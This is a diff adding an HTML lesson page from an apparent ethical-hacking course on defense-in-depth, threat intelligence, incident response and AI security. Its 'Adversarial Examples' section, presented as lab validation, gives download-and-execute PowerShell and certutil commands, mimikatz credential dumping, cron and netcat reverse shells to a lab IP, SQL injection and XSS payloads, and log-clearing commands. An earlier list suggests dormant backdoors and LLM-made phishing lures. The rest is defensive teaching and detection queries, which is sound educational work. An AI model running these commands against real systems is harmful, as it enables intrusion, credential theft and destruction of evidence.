+        <li>Leave dormant backdoors that re-infect after the initial eradication phase completes.</li>
+        <li>Study public breach reports to understand defender TTPs and evolve attack patterns accordingly.</li>
+      </ul>
+
+      <h3>AI/ML Exploitation</h3>
+      <ul>
+        <li>Train models on security vendor documentation to identify detection gaps in popular EDR/AV products.</li>
+        <li>Use LLMs to generate social engineering lures that bypass semantic NLP detection engines.</li>
+        <li>Automate reconnaissance to discover misconfigured assets, exposed APIs, and weak authentication endpoints.</li>
+      </ul>
+
+      <div class="info-remember">
+          <strong>Remember:</strong> "Controls do not stop a determined adversary; they slow the adversary down, force them to reveal themselves, 
+          and buy defenders time to detect and respond. Your job is to make that time as short as possible."
+        </p>
+      </div>
+    </section>
+
+<!-- ============================================================ -->
+<!-- ADVERSARIAL EXAMPLES — COMMANDS AND TOOLS                     -->
+<!-- ============================================================ -->
+
+    <section class="module-section" id="adversarial-examples">
+      <h2>6. Adversarial Examples — Commands and Tools</h2>
+      <p>Concrete command lines, tool syntax, and pseudo-code for authorized control validation, purple-team emulation, and adversary simulation. Keep these copy-paste friendly for labs.</p>
+
+      <h3>Defense-in-Depth Layer Validation</h3>
+      
+      <pre><code><span style="color:#4CAF50;"># Validate network segmentation between VLANs (authorized scoping required)</span>
+$ nmap -sn 10.0.10.0/24 --scan-delay 1s -oG segment_test.txt
+$ hping3 -S -p 443 10.0.20.5 --traceroute
+
+<span style="color:#4CAF50;"># Test firewall rule efficacy from an assumed-compromised host</span>
+$ nmap -sS -Pn -p 22,80,443,3389 10.0.50.0/24 --max-retries 1 -oA fw_validate
+
+<span style="color:#4CAF50;"># Validate WAF rule effectiveness with controlled malicious payloads</span>
+$ curl -X POST http://target.com/api/login --data "user=admin' OR '1'='1" -w "%{http_code}"
+$ curl -X POST http://target.com/api/login --data "user=&lt;script&gt;alert(1)&lt;/script&gt;" -w "%{http_code}"
+<span style="color:#4CAF50;"># Expect 403 if WAF is active; 200 indicates bypass opportunity</span></code></pre>
+
+      <h3>Endpoint &amp; EDR Detection Validation</h3>
+      
+      <pre><code><span style="color:#4CAF50;"># Simulate LOLBin execution for EDR behavioral detection testing</span>
+$ powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/test.txt')"
+$ certutil -urlcache -split -f http://10.10.14.5/payload.exe C:\Windows\Temp\update.exe
+
+<span style="color:#4CAF50;"># Test EDR process-creation telemetry with benign simulation</span>
+$ mimikatz # privilege::debug # sekurlsa::logonpasswords
+<span style="color:#4CAF50;"># ^ Authorized Red Team only — verify EDR detects credential access patterns</span>
+
+<span style="color:#4CAF50;"># Linux persistence simulation for detection engineering</span>
+$ echo "* * * * * /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.5/9001 0&gt;&amp;1'" | crontab -
+$ echo "nc -e /bin/bash 10.10.14.5 9001" &gt; /etc/update.sh &amp;&amp; chmod +x /etc/update.sh</code></pre>
+
+      <h3>CTI &amp; Threat Hunting Query Examples</h3>
+      
+      <pre><code><span style="color:#4CAF50;"># Ingest and validate IOC feed (JSON) with jq</span>
+$ curl -s https://threat-intel.example.com/feed.json | jq '.indicators[] | select(.type == "ipv4") | .value'
+
+<span style="color:#4CAF50;"># Sigma rule validation for detection engineering</span>
+$ sigma convert -t splunk rules/windows/process_creation/win_suspicious_powershell.yml
+
+<span style="color:#4CAF50;"># Splunk threat hunting query (suspicious PowerShell downloads)</span>
+index=windows EventCode=4688 CommandLine="*IEX*" OR CommandLine="*Invoke-Expression*" 
+| stats count by ComputerName, User, CommandLine 
+| where count &gt; 5
+
+<span style="color:#4CAF50;"># Elastic / Kibana detection query (lateral movement via SMB)</span>
+event.action:"network_connection" AND destination.port:445 AND source.ip:(10.0.0.0/8 OR 172.16.0.0/12) 
+AND NOT user.name:("SYSTEM" OR "NETWORK SERVICE")</code></pre>
+
+      <h3>Incident Response Playbook Validation</h3>
+      
+      <pre><code><span style="color:#4CAF50;"># Simulate log tampering for IR forensics validation</span>
+$ wevtutil cl System
+$ wevtutil cl Security
+$ echo "" &gt; /var/log/auth.log
+<span style="color:#4CAF50;"># ^ Verify SIEM alerts on log clearance and IR playbook triggers</span>
+
+<span style="color:#4CAF50;"># Test memory capture workflow under IR conditions</span>
+$ winpmem_mini_x64.exe memdump.raw
+$ volatility3 -f memdump.raw windows.info
+
+<span style="color:#4CAF50;"># Validate backup integrity during recovery phase</span>
+$ sha256sum /backup/critical-data.tar.gz &gt; /backup/integrity.sha256
+$ tar -tzf /backup/critical-data.tar.gz | head -n 20</code></pre>
+
+      <h3>AI/ML Security &amp; Adversarial Testing</h3>
+      
+      <pre><code><span style="color:#4CAF50;"># Adversarial input test against ML-based phishing classifier</span>
+<span style="color:#4CAF50;"># (Lab environment / authorized model validation only)</span>
+import requests
+
+payloads = [
+    "Urgent: Verify your account immediately!!!",
+    "Urgent: V3rify your acc0unt immediat3ly!!!",
+    "Urgent: verify your account immediately (click here)"
+]
+
+for p in payloads:
+    r = requests.post("http://ml-api.internal/classify", json={"subject": p})
+    print(p, "->", r.json()["label"], r.json()["confidence"])</code></pre>
+
+      <h3>Control Validation Tool Table</h3>
+      
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Control validation tool table by defensive layer">
+          <thead>
+            <tr>
+              <th>Defensive Layer</th>
+              <th>Tool</th>
+              <th>Purpose</th>
+              <th>Relevant Option</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Perimeter</td>
+              <td>nmap / hping3</td>
+              <td>Firewall and segmentation validation</td>
+              <td><code>-sS -Pn --max-retries 1</code></td>
+            </tr>
+            <tr>
+              <td>Network</td>
+              <td>traceroute / tcpdump</td>
+              <td>Path analysis and traffic inspection</td>
+              <td><code>-i eth0 -n port 443</code></td>
+            </tr>
+            <tr>
+              <td>Endpoint</td>
+              <td>Atomic Red Team / Mimikatz</td>
+              <td>EDR telemetry and detection validation</td>
+              <td><code>Invoke-AtomicTest T1003.001</code></td>
+            </tr>
+            <tr>
+              <td>Application</td>
+              <td>curl / Burp Suite</td>
+              <td>WAF and input validation testing</td>
+              <td><code>--data "user=admin' OR '1'='1"</code></td>
+            </tr>
+            <tr>
+              <td>Data</td>
+              <td>sha256sum / openssl</td>
+              <td>Integrity and encryption verification</td>
+              <td><code>sha256sum / openssl enc -aes-256-cbc</code></td>
+            </tr>
+            <tr>
+              <td>CTI</td>
+              <td>jq / Sigma</td>
+              <td>IOC processing and detection rule validation</td>
+              <td><code>jq '.indicators[]'</code></td>
+            </tr>
+            <tr>
+              <td>IR</td>
+              <td>winpmem / volatility3</td>
+              <td>Forensic capture and memory analysis</td>
+              <td><code>-f memdump.raw windows.info</code></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      
+      <div class="reminder">
+        <em><strong>Reminder:</strong></em> Testing controls without authorization is indistinguishable from attack. Every validation command 
+		must be scoped, timed, and documented. If you cannot map the test to a control objective and a detection opportunity, you 
+		are not validating security — you are creating risk.
+      </div>
+    </section>
+
+<!-- ============================================================ -->
+<!-- KEY TAKEAWAYS                                                 -->
+<!-- ============================================================ -->
+
+    <section class="module-section" id="key-takeaways">
+      <h2>7. Key Takeaways</h2>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Key takeaways">
+          <thead>
+            <tr>
+              <th>Area</th>
+              <th>What Was Proven</th>
+              <th>Operational Meaning</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Information Assurance</strong></td>
+              <td>Protecting information throughout its lifecycle requires technical, physical, and administrative controls working together.</td>
+              <td>Supports business continuity while reducing overall organizational risk.</td>
+            </tr>
+            <tr>
+              <td><strong>Adaptive Security</strong></td>
+              <td>A static security program becomes obsolete quickly; controls must evolve as threats and technology change.</td>
+              <td>Improves an organization's ability to Protect, Detect, Respond, and Predict emerging threats.</td>
+            </tr>
+            <tr>
+              <td><strong>Defense-in-Depth</strong></td>
+              <td>No single control is perfect, and layers must be stacked to compensate for individual failures.</td>
+              <td>Multiple defensive layers increase attacker workload and create additional detection opportunities.</td>
+            </tr>
+            <tr>
+              <td><strong>Risk Management</strong></td>
+              <td>Organizations cannot eliminate all risk but can identify, assess, prioritize, and treat it systematically.</td>
+              <td>Resources can be focused on the threats most likely to cause significant impact.</td>
+            </tr>
+            <tr>
+              <td><strong>Cyber Threat Intelligence (CTI)</strong></td>
+              <td>Raw threat data becomes actionable only when curated, contextualized, and aligned to organizational decisions.</td>
+              <td>Improves strategic planning, threat hunting, incident response, and defensive decision-making.</td>
+            </tr>
+            <tr>
+              <td><strong>Threat Intelligence Lifecycle</strong></td>
+              <td>Intelligence is most effective when continuously collected, processed, analyzed, and integrated.</td>
+              <td>Creates a repeatable process for understanding and responding to evolving threats.</td>
+            </tr>
+            <tr>
+              <td><strong>Threat Modeling</strong></td>
+              <td>Anticipating attacker logic during design prevents expensive vulnerabilities in production.</td>
+              <td>Helps identify design weaknesses and implement controls earlier in the development lifecycle.</td>
+            </tr>
+            <tr>
+              <td><strong>Incident Management &amp; Response</strong></td>
+              <td>Preparation, coordination, containment, recovery, and lessons learned are critical during security incidents.</td>
+              <td>Reduces operational disruption and accelerates recovery from attacks.</td>
+            </tr>
+            <tr>
+              <td><strong>AI &amp; Machine Learning</strong></td>
+              <td>Automation, anomaly detection, behavioral analysis, and large-scale data processing improve defensive efficiency.</td>
+              <td>Improves security monitoring, threat detection, and defensive efficiency at scale.</td>
+            </tr>
+            <tr>
+              <td><strong>AI Weaponization</strong></td>
+              <td>Attackers can use AI for phishing, malware mutation, reconnaissance, and vulnerability discovery.</td>
+              <td>Defenders must evolve beyond traditional signature-based controls toward behavioral and intelligence-driven defenses.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="reminder">
+        <em><strong>Reminder:</strong></em>  Treat controls, CTI, and IR as a single feedback loop. Measure outcomes, iterate playbooks, and prioritise highest-impact mitigations first.
+      </div>
+    </section>
+
+<!-- ============================================================ -->
+<!-- ASSESSMENT & NEXT STEPS                                       -->
+<!-- ============================================================ -->
+
+    <section class="module-section" id="assessment-next-steps">
+      <h2>8. Assessment &amp; Next Steps</h2>
+      <p>
+        Before moving on to (Security Laws / Legal &amp; Compliance Foundations), confirm that you can translate defensive architecture into risk-based decisions, articulate incident response discipline, and explain how AI shifts both offense and defense.
+      </p>
+
+      <h3>Knowledge Check</h3>
+      <ol>
+        <li>What is the difference between Information Assurance and defense-in-depth, and why does that distinction matter for security architecture?</li>
+        <li>How does the adaptive security model (Protect → Detect → Respond → Predict) create a feedback loop for continuous improvement?</li>
+        <li>What are the four risk treatment options, and provide one concrete example where <strong>transfer</strong> is more appropriate than <strong>reduce</strong>.</li>
+        <li>List the nine incident response steps and identify which step most often suffers from inadequate preparation in under-resourced teams.</li>
+        <li>Explain the difference between AI-assisted defense and AI weaponization, with one example of each.</li>
+      </ol>
+
+      <h3>Professional Lens Self-Check</h3>
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Professional scenario self-check">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Scenario</th>
+              <th>Professional Response &amp; Control</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>1</td>
+              <td>During an IR engagement, you discover the attacker used an AI-generated polymorphic payload. The EDR missed it because it had no signature. The CISO wants to blame the vendor.</td>
+              <td><strong>Treat as a controls gap, not a vendor failure.</strong> Shift layer-3 endpoint detection from signatures to behavioral rules. Validate coverage with purple-team emulation before replacing tooling.</td>
+            </tr>
+            <tr>
+              <td>2</td>
+              <td>A risk assessment flags "Almost Certain / Critical" for unpatched internet-facing VPN appliances. The board asks to "accept the risk" because patching requires downtime.</td>
+              <td><strong>Reject acceptance for critical likelihood.</strong> Propose compensating controls (geo-blocking, MFA, temporary WAF rules), a maintenance window, and documented residual-risk sign-off.</td>
+            </tr>
+            <tr>
+              <td>3</td>
+              <td>Your CTI feed reports IOCs for a banking trojan targeting your sector. The SOC manager says "we're not a bank, ignore it."</td>
+              <td><strong>Validate overlap.</strong> Sector-adjacent threats spill over via shared infrastructure or supply chain. Use strategic CTI to brief leadership and tune tactical detection rules proactively.</td>
+            </tr>
+            <tr>
+              <td>4</td>
+              <td>An intern runs a vulnerability scanner against production without scope authorization and causes an outage.</td>
+              <td><strong>Initiate incident response.</strong> Treat as an unauthorized test that impacted availability. Record, contain, preserve logs, and update the VM playbook to require change-control gating.</td>
+            </tr>
+            <tr>
+              <td>5</td>
+              <td>Threat modeling identifies that your API lacks rate limiting. DevOps says "we'll fix it next sprint."</td>
+              <td><strong>Document accepted risk with a deadline.</strong> If the API handles sensitive data, demand temporary virtual patching or a WAF rule. Untreated design flaws become exploitable realities.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>Practical Validation</h3>
+      <ul>
+        <li>Draw a <strong>defense-in-depth diagram</strong> for a web application handling PII, labeling each of the 5 layers with one specific control and one adversary bypass technique.</li>
+        <li>Write a <strong>one-page incident response playbook</strong> for "AI-generated polymorphic malware detection," including: detection triggers (behavioral), containment steps, eradication checklist, and recovery validation.</li>
+        <li>Given a risk matrix quadrant of <strong>"Likely / Major"</strong>, draft a three-sentence business case for executive leadership requesting budget for treatment.</li>
+      </ul>
+
+      <h3>Gateway Criteria for the next section</h3>
+      <p>You are cleared to proceed when you can:</p>
+      <ol>
+        <li>Explain why defense-in-depth fails when layers are <strong>"set and forgotten"</strong> rather than continuously tested and tuned.</li>
+        <li>Compare strategic, tactical, operational, and technical CTI across audience, source, and shelf-life without referencing the table.</li>
+        <li>Describe the four risk treatment options and give a concrete example where <strong>transfer</strong> is more appropriate than <strong>reduce</strong>.</li>
+        <li>List the nine incident response steps and identify which step most often suffers from inadequate preparation in under-resourced teams.</li>
+        <li>Articulate the difference between AI-assisted defense and AI weaponization, with one example of each.</li>
+      </ol>
+
+      <h3>Recommended Reading</h3>
+      <ul>
+        <li><a href="https://attack.mitre.org" target="_blank" rel="noopener">MITRE ATT&amp;CK Framework</a>: Adversary TTPs and detection opportunities.</li>
+        <li><a href="https://www.nist.gov/cyberframework" target="_blank" rel="noopener">NIST Cybersecurity Framework</a>: Core controls, implementation tiers, and risk management guidance.</li>
+        <li><a href="https://www.sans.org" target="_blank" rel="noopener">SANS Institute</a>: Incident response playbooks and security control guidance.</li>
+        <li><a href="https://www.pcisecuritystandards.org" target="_blank" rel="noopener">PCI Security Standards Council</a>: Control requirements for payment card environments.</li>
+        <li><a href="https://www.iso.org/standard/27001" target="_blank" rel="noopener">ISO/IEC 27001</a>: International standard for information security management systems.</li>
+      </ul>
+
+      <div class="info-remember" style="margin: 15px 0;">
+        <em>RedOps Reminder:</em> Your controls are a verb, not a noun — stack layers to starve attacker time, convert CTI into 
+		detection logic before it expires, run IR with the discipline of a rehearsal, and let AI do the scaling. A static 
+		defense isn't security, it's documentation of your own compromise.
+      </div>
+    </section>
+
+<!-- ============================================================ -->
+<!-- FLOATING NAVIGATION -->
+<!-- ============================================================ -->
+<div class="lesson-nav-container">
+      <a href="https://iscsecurity.org/content/1-ethical-hacking/1-introduction-to-ethical-hacking/05-hacking-methodologies" class="nav-link-btn">👈 Back</a>
+      <a href="https://iscsecurity.org/content/1-ethical-hacking/1-introduction-to-ethical-hacking/07-security-laws" class="nav-link-btn">Next 👉</a>
+    </div>
+
+    </article>
+  </main>
+</body>
+</html>
